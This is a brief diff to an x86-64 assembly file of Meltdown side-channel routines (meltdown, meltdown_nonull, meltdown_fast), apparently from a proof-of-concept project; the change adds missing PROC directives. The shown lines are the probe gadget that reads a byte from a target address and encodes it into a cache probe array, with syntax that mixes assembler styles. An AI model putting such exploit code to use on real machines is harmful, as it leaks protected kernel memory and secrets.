@@ -13,7 +13,7 @@ meltdown PROC
 	mov rbx, qword ptr[rbx+rax]
 meltdown ENDP
 
-meltdown_nonull
+meltdown_nonull PROC
 1:                                                        
     movzx (rcx), rax                                        
     shl rax, 12                                            
@@ -21,7 +21,7 @@ meltdown_nonull
     mov rbx, qword ptr[rbx+rax]   
 meltdown_nonull ENDP
 
-meltdown_fast
+meltdown_fast PROC
 1:
 	movzx (rcx), rax                                  
     shl rax, 12
